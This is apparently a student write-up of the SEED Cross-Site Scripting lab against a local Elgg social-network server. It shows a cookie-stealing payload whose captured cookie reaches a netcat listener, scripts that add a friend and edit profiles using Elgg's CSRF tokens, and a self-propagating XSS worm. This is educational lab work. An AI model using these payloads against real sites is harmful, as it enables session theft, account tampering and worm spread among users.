# Cross-Site Scripting (XSS) Attack Lab

## Task 1: Posting a Malicious Message to Display an Alert Window

done :)

## Task 2: Posting a Malicious Message to Display Cookies

Upon visiting Samy's profile, an alert window with the user's `Elgg` cookie appears.

## Task 3: Stealing Cookies from the Victim's Machine

Output of `nc -lknv 5555` upon loading Samy's profile:

```
$ nc -lknv 5555
Listening on 0.0.0.0 5555
Connection received on 10.0.2.15 43804
GET /?c=Elgg%3D3cdfjasb3s6eqpg4f5kmhh6unh HTTP/1.1
Host: 10.9.0.1:5555
...
Referer: http://www.seed-server.com/profile/samy
```

The client browser continues to display a loading status until the `nc` process is stopped, which might make the victim suspicious.

## Task 4: Becoming the Victim's Friend

HTTP GET request sent when Alice adds Boby as a friend:

```
http://www.seed-server.com/action/friends/add?friend=57&__elgg_ts=1747961979,1747961979&__elgg_token=MXIraps9k30e6MzW85Oq0w,MXIraps9k30e6MzW85Oq0w
```

JavaScript code to automatically add Samy as a friend:

```html
<script type="text/javascript">
window.onload = function () {
    var Ajax = null;

    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    //Construct the HTTP request to add Samy as a friend.
    var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;

    //Create and send Ajax request to add friend
    Ajax = new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
}
</script>
```

When Alice loads Samy's profile, nothing appears amiss the first time; however, she has already added Samy as a friend, and she can see this once she reloads the page.

The lines `var ts = ...` and `var token = ...` retrieve the timestamp and token fields that Elgg embeds in each page to be used as countermeasures against CSRF attacks. Actions such as adding friends require these fields to be present in the `GET` or `POST` request as evidence that it was not a cross-site request.

If we cannot switch to the Text mode of the "About Me" field, then the attack will no longer be successful, since the Editor mode escapes special characters in its contents; for example, `<script>` is turned into `&lt;script&gt;`. This means that Samy can no longer inject HTML tags or JS scripts into the "About Me" field.

## Task 5: Modifying the Victim's Profile

The HTTP POST request to modify a user's profile is directed to `http://www.seed-server.com/action/profile/edit`. The `description` parameter specifies the contents of the "About Me" field; we also need to supply the parameter `accesslevel[description]=2` to make sure that it is publicly visible.

JavaScript code to modify the victim's profile:

```html
<script type="text/javascript">
window.onload = function(){
    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    //and Security Token __elgg_token
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    //Construct the content of your url.
    var content = "description=Samy is my hero&accesslevel[description]=2" + ts + token + userName + guid;
    var samyGuid = 59;
    var sendurl = "http://www.seed-server.com/action/profile/edit";

    if (elgg.session.user.guid != samyGuid)
    {
        //Create and send Ajax request to modify profile
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader(
            "Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
</script>
```

Without the check of user ID against Samy's ID, Samy will overwrite his own "About Me" when returning to his profile page after editing it. Since we have not yet made the worm self-propagating, this immediately neutralises the attack. The overwrite happens as soon as he returns to his profile page, although it will only be visible once he reloads it once more.

## Task 6: Writing a Self-propagating XSS Worm

JavaScript code:

```html
<script id="worm" type="text/javascript">
window.onload = function(){
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script><p>Samy is the One Hero</p>";

    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
    var content = "description=" + wormCode + "&accesslevel[description]=2" + ts + token + userName + guid;

    var friendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
    var editurl = "http://www.seed-server.com/action/profile/edit";

    var samyGuid = 59;
    if (elgg.session.user.guid != samyGuid)
    {
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("GET", friendurl, true);
        Ajax.send();

        Ajax = new XMLHttpRequest();
        Ajax.open("POST", editurl, true);
        Ajax.setRequestHeader(
            "Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
</script>
```